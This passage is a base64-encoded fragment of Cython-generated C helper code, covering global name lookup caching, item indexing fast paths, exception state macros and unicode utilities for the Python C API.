amVjdCAqb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9vYmplY3RfZGljdF92ZXJzaW9uX21hdGNoZXMoUHlPYmplY3QqIG9iaiwgUFlfVUlOVDY0X1QgdHBfZGljdF92ZXJzaW9uLCBQWV9VSU5UNjRfVCBvYmpfZGljdF92ZXJzaW9uKTtcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgwKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcbiNkZWZpbmUgX19QWVhfUFlfRElDVF9MT09LVVBfSUZfTU9ESUZJRUQoVkFSLCBESUNULCBMT09LVVApICAoVkFSKSA9IChMT09LVVApO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgIGRvIHtcXFxuICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1xcXG4gICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XFxcbiAgICAodmFyKSA9IChsaWtlbHkoX19weXhfZGljdF92ZXJzaW9uID09IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCkpKSA/XFxcbiAgICAgICAgKGxpa2VseShfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSkgPyBfX1B5eF9OZXdSZWYoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpIDogX19QeXhfR2V0QnVpbHRpbk5hbWUobmFtZSkpIDpcXFxuICAgICAgICBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1xcXG59IHdoaWxlKDApXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICBkbyB7XFxcbiAgICBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb247XFxcbiAgICBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XFxcbiAgICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUsICZfX3B5eF9kaWN0X3ZlcnNpb24sICZfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSk7XFxcbn0gd2hpbGUoMClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUsIFBZX1VJTlQ2NF9UICpkaWN0X3ZlcnNpb24sIFB5T2JqZWN0ICoqZGljdF9jYWNoZWRfdmFsdWUpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3Iob2JqLCBhdHRyX25hbWUpICBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSwgMClcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAxKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWxOb0Vycm9yKG8sbikgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobyxuKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG8sbikgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvLG4pXG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjayk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spXFxcbiAgICAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VBZGQob3AxLCBvcDIpIDogUHlOdW1iZXJfQWRkKG9wMSwgb3AyKSlcbiNlbmRpZlxuXG5cbiNkZWZpbmUgX19QeXhfR2V0SXRlbUludChvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsLCB1bnNhZmVfc2hhcmVkKVxcXG4gICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cXFxuICAgIF9fUHl4X0dldEl0ZW1JbnRfRmFzdChvLCAoUHlfc3NpemVfdClpLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgdW5zYWZlX3NoYXJlZCkgOlxcXG4gICAgKGlzX2xpc3QgPyAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpIDpcXFxuICAgICAgICAgICAgICAgX19QeXhfR2V0SXRlbUludF9HZW5lcmljKG8sIHRvX3B5X2Z1bmMoaSkpKSlcbiNkZWZpbmUgX19QeXhfR2V0SXRlbUludF9MaXN0KG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwsIHVuc2FmZV9zaGFyZWQpXFxcbiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1xcXG4gICAgX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QobywgKFB5X3NzaXplX3QpaSwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIHVuc2FmZV9zaGFyZWQpIDpcXFxuICAgIChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHdyYXBhcm91bmQsIGludCBib3VuZHNjaGVjaywgaW50IHVuc2FmZV9zaGFyZWQpO1xuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X1R1cGxlKG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwsIHVuc2FmZV9zaGFyZWQpXFxcbiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1xcXG4gICAgX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KG8sIChQeV9zc2l6ZV90KWksIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCB1bnNhZmVfc2hhcmVkKSA6XFxcbiAgICAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJ0dXBsZSBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X1R1cGxlX0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHdyYXBhcm91bmQsIGludCBib3VuZHNjaGVjaywgaW50IHVuc2FmZV9zaGFyZWQpO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2ssIGludCB1bnNhZmVfc2hhcmVkKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0ob2JqLCBrZXkpICBQeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgX1B5RXJyX1N0YWNrSXRlbSAqIF9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU2F2ZSh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uU2F2ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblNhdmUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25SZXNldChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0Yik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgICBQeUVycl9HZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uUmVzZXQodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfU2V0RXhjSW5mbyh0eXBlLCB2YWx1ZSwgdGIpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X0dldEV4Y2VwdGlvbih0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fR2V0RXhjZXB0aW9uKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIGludCBfX1B5eF9fR2V0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTtcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7XG4gICAgUHlMaXN0T2JqZWN0KiBMID0gKFB5TGlzdE9iamVjdCopIGxpc3Q7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpO1xuICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSkge1xuICAgICAgICBQeV9JTkNSRUYoeCk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4O1xuICAgICAgICAjZWxzZVxuICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X1NFVF9TSVpFKGxpc3QsIGxlbiArIDEpO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIFB5TGlzdF9BcHBlbmQobGlzdCwgeCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseClcbiNlbmRpZlxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQ2xvc3VyZU5hbWVFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTtcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pO1xuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlSYW5nZV9DaGVjaylcbiAgI2RlZmluZSBQeVJhbmdlX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjaygob2JqKSwgJlB5UmFuZ2VfVHlwZSlcbiNlbmRpZlxuXG5cbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVW5pY29kZShvYmopXFxcbiAgICAobGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeU9iamVjdF9TdHIob2JqKSlcblxuXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2lmIENZVEhPTl9WRUNUT1JDQUxMXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgUHlPYmplY3RfVmVjdG9yY2FsbFxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9QeU9iamVjdF9WZWN0b3JjYWxsXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyhuKSBQeVR1cGxlX05ldyhuKVxuc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7XG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdFxuI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKVxuI2RlZmluZSBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbikgUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSlcbiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtU3RyaW5nKGJ1aWxkZXIsIGtleSwgdmFsdWUpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChuYW1lLCBhcmdzLCBuYXJnc2YpIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmLCBOVUxMKVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSk7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSlcbiNlbGlmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChzKSkgPyBQeUxvbmdfVHlwZS50cF9yZXByKHMpIDpcXFxuICAgICAgICBsaWtlbHkoUHlGbG9hdF9DaGVja0V4YWN0KHMpKSA/IFB5RmxvYXRfVHlwZS50cF9yZXByKHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSlcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShQeU9iamVjdCAqb2JqKTtcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0Jvb2xOZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGxvbmcgaW5wbGFjZSk7XG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25Td2FwKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25Td2FwKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKFB5T2JqZWN0KiBpdGVtLCBQeU9iamVjdCogc2VxLCBpbnQgZXEpIHtcbiAgICBpbnQgcmVzdWx0ID0gUHlTZXF1ZW5jZV9Db250YWlucyhzZXEsIGl0ZW0pO1xuICAgIHJldHVybiB1bmxpa2VseShyZXN1bHQgPCAwKSA/IHJlc3VsdCA6IChyZXN1bHQgPT0gKGVxID09IFB5X0VRKSk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGV4cGVjdGVkKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGluZGV4KTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXRlckZpbmlzaCh2b2lkKTtcblxuXG5zdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9Db250YWluc1RGKFB5T2JqZWN0KiBzdWJzdHJpbmcsIFB5T2JqZWN0KiB0ZXh0LCBpbnQgZXEpIHtcbiAgICBpbnQgcmVzdWx0ID0gUHlVbmljb2RlX0NvbnRhaW5zKHRleHQsIHN1YnN0cmluZyk7XG4gICAgcmV0dXJuIHVubGlrZWx5KHJlc3VsdCA8IDApID8gcmVzdWx0IDogKHJlc3VsdCA9PSAoZXEgPT0gUHlfRVEpKTtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0U2xpY2UoXG4gICAgICAgIFB5T2JqZWN0KiBvYmosIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLFxuICAgICAgICBQeU9iamVjdCoqIHB5X3N0YXJ0LCBQeU9iamVjdCoqIHB5X3N0b3AsIFB5T2JqZWN0KiogcHlfc2xpY2UsXG4gICAgICAgIGludCBoYXNfY3N0YXJ0LCBpbnQgaGFzX2NzdG9wLCBpbnQgd3JhcGFyb3VuZCk7XG5cblxuIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAjaWYgQ1lUSE9OX1JFRk5BTk5ZXG4gICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQsIHVuc2FmZV9zaGFyZWQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQsIHVuc2FmZV9zaGFyZWQsIF9fcHl4X3JlZm5hbm55KVxuICAgICNlbHNlXG4gICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQsIHVuc2FmZV9zaGFyZWQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQsIHVuc2FmZV9zaGFyZWQpXG4gICAgI2VuZGlmXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0X19QeXhfUmVmZXJlbmNlU2hhcmluZ19EZWZpbml0ZWx5VW5pcXVlSW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQsIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfRGVmaW5pdGVseVVuaXF1ZSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZUluUGxhY2UobGVmdCwgcmlnaHQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0LCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX0Z1bmN0aW9uQXJndW1lbnRJblBsYWNlKGxlZnQsIHJpZ2h0KSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCwgX19QeXhfUmVmZXJlbmNlU2hhcmluZ19EZWZpbml0ZWx5VW5pcXVlKVxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlSW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQsIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlKVxuICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoUHlPYmplY3QgKipwX2xlZnQsIFB5T2JqZWN0ICpyaWdodCwgaW50IHVuc2FmZV9zaGFyZWRcbiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWVxuICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55XG4gICAgICAgICNlbmRpZlxuICAgICk7XG4jZWxzZVxuI2RlZmluZS